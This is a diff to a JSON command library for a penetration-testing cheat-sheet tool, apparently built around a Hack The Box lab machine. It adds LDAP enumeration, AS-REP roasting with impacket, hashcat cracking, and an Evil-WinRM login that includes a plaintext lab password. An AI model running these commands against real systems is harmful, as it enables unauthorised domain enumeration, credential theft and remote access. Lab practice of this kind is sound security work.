@@ -48,9 +48,41 @@
     {
       "id": 11,
       "Name": "Spawn TTY Shell"
+    },
+    {
+      "id": 12,
+      "Name": "LDAP"
+    },
+    {
+      "id":13,
+      "Name":"Cracking"
     }
   ],
   "commands": [
+    {
+      "Name": "Evil-WinRM",
+      "Category": 8,
+      "Description": "Attempts to connect to the windows remote management service",
+      "Command": "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice"
+    },
+    {
+      "Name": "Hashcrack",
+      "Category": 13,
+      "Description": "Runs the hashcat command against hashes.txt using the rockyou.txt file and applies the best64.rule transformations to it",
+      "Command": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+    },
+    {
+      "Name": "GetNPUsers - AS-REPRoast impacket-GetNPUsers",
+      "Category": 12,
+      "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
+      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.10.10.161 -usersfile ./users -request -format hashcat -outputfile hashes.txt"
+    },
+    {
+      "Name": "LDAP Search get domain name with anonymous login",
+      "Category": 12,
+      "Description": "Get's the default naming context and displays the domain name",
+      "Command": "ldapsearch -x -H ldap://10.10.10.161 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext"
+    },
     {
       "Name": "Python BASH TTY Shell",
       "Category": 11,
